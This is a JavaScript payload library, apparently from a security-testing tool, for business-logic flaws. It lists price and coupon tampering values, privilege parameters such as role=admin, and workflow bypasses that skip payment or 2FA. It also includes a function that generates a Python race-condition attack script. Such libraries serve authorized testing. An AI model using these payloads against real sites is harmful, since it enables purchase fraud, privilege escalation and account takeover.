// Business Logic Vulnerability Payloads
// Comprehensive payload database for business logic testing

const BusinessLogicPayloads = {
    // Price manipulation
    priceManipulation: [
        { field: 'price', original: '1000', modified: '0', description: 'Set price to zero' },
        { field: 'price', original: '1000', modified: '-100', description: 'Negative price' },
        { field: 'price', original: '1000', modified: '0.01', description: 'Minimal price' },
        { field: 'quantity', original: '1', modified: '-1', description: 'Negative quantity' },
        { field: 'quantity', original: '1', modified: '999999', description: 'Extreme quantity' },
        { field: 'discount', original: '10', modified: '100', description: '100% discount' },
        { field: 'discount', original: '10', modified: '150', description: 'Over 100% discount' },
        { field: 'total', original: '100', modified: '1', description: 'Modify total directly' }
    ],

    // Integer overflow/underflow
    integerManipulation: [
        { value: '2147483647', description: 'Max 32-bit signed integer' },
        { value: '2147483648', description: 'Overflow 32-bit signed' },
        { value: '-2147483648', description: 'Min 32-bit signed integer' },
        { value: '-2147483649', description: 'Underflow 32-bit signed' },
        { value: '9999999999999', description: 'Very large number' },
        { value: '0', description: 'Zero value' }
    ],

    // Workflow bypass
    workflowBypass: [
        { step: 'Skip payment', technique: 'Direct access to confirmation page' },
        { step: 'Skip verification', technique: 'Access protected resource directly' },
        { step: 'Skip 2FA', technique: 'Navigate to post-auth page' },
        { step: 'Skip CAPTCHA', technique: 'Remove captcha parameter' },
        { step: 'Skip email verify', technique: 'Change email without verification' }
    ],

    // Race condition windows
    raceConditions: [
        { scenario: 'Coupon double-use', description: 'Apply coupon multiple times simultaneously' },
        { scenario: 'Balance check bypass', description: 'Multiple purchases before balance update' },
        { scenario: 'Inventory bypass', description: 'Purchase more than available stock' },
        { scenario: 'Limit bypass', description: 'Exceed purchase limits via concurrent requests' }
    ],

    // Parameter tampering
    parameterTampering: [
        { param: 'role', values: ['admin', 'administrator', 'superuser'] },
        { param: 'isAdmin', values: ['true', '1', 'yes'] },
        { param: 'verified', values: ['true', '1'] },
        { param: 'status', values: ['approved', 'confirmed', 'paid'] },
        { param: 'userId', values: ['1', '0', 'admin'] },
        { param: 'access_level', values: ['0', '9', '999'] }
    ],

    // Encoding bypass
    encodingBypass: [
        { technique: 'Remove param', description: 'Delete validation parameter entirely' },
        { technique: 'Empty value', description: 'Set parameter to empty string' },
        { technique: 'Null byte', description: 'Append %00 to value' },
        { technique: 'Array param', description: 'Send param[]=value' },
        { technique: 'Duplicate param', description: 'Send param twice with different values' }
    ],

    // Trust boundary violations
    trustBoundary: [
        { type: 'Client-side validation', description: 'Remove/bypass JS validation' },
        { type: 'Hidden field modification', description: 'Change hidden form fields' },
        { type: 'Cookie manipulation', description: 'Modify session/preference cookies' },
        { type: 'Header injection', description: 'Modify trusted headers' }
    ],

    // Coupon/discount abuse
    couponAbuse: [
        { technique: 'Reuse coupon', description: 'Apply same coupon multiple times' },
        { technique: 'Stack coupons', description: 'Apply multiple coupons' },
        { technique: 'Negative discount', description: 'Apply coupon to increase price then refund' },
        { technique: 'Case variation', description: 'COUPON vs coupon vs Coupon' }
    ],

    // Email-based flaws
    emailFlaws: [
        { technique: 'Email change without verify', description: 'Change to attacker email' },
        { technique: 'Dangling markup', description: 'Inject markup in email' },
        { technique: 'Account takeover', description: 'Password reset to changed email' }
    ]
};

// Test scenarios
const BusinessLogicTests = {
    priceManipulation: {
        name: 'Price Manipulation',
        description: 'Modify prices client-side or in requests',
        severity: 'CRITICAL'
    },
    workflowBypass: {
        name: 'Workflow Bypass',
        description: 'Skip required steps in multi-step process',
        severity: 'HIGH'
    },
    raceCondition: {
        name: 'Race Condition',
        description: 'Exploit timing windows between checks',
        severity: 'HIGH'
    },
    parameterTampering: {
        name: 'Parameter Tampering',
        description: 'Modify request parameters to gain privilege',
        severity: 'HIGH'
    },
    integerOverflow: {
        name: 'Integer Overflow',
        description: 'Cause overflow/underflow in calculations',
        severity: 'CRITICAL'
    },
    couponAbuse: {
        name: 'Coupon Abuse',
        description: 'Exploit discount/coupon logic',
        severity: 'MEDIUM'
    }
};

// Helper functions
function getPriceManipulationPayloads() {
    return BusinessLogicPayloads.priceManipulation;
}

function getWorkflowBypassPayloads() {
    return BusinessLogicPayloads.workflowBypass;
}

function getRaceConditionPayloads() {
    return BusinessLogicPayloads.raceConditions;
}

function getParameterTamperingPayloads() {
    return BusinessLogicPayloads.parameterTampering;
}

function getPayloadCount() {
    return BusinessLogicPayloads.priceManipulation.length +
        BusinessLogicPayloads.integerManipulation.length +
        BusinessLogicPayloads.workflowBypass.length +
        BusinessLogicPayloads.raceConditions.length +
        BusinessLogicPayloads.parameterTampering.length +
        BusinessLogicPayloads.encodingBypass.length +
        BusinessLogicPayloads.couponAbuse.length;
}

function generateRaceConditionScript(url, count = 20) {
    return `# Race Condition Attack Script
# Send ${count} concurrent requests

import asyncio
import aiohttp

async def make_request(session, url):
    async with session.post(url) as response:
        return await response.text()

async def race_attack():
    url = "${url}"
    async with aiohttp.ClientSession() as session:
        tasks = [make_request(session, url) for _ in range(${count})]
        results = await asyncio.gather(*tasks)
        print(f"Sent {len(results)} requests")

asyncio.run(race_attack())`;
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        BusinessLogicPayloads,
        BusinessLogicTests,
        getPriceManipulationPayloads,
        getWorkflowBypassPayloads,
        getRaceConditionPayloads,
        getParameterTamperingPayloads,
        getPayloadCount,
        generateRaceConditionScript
    };
}
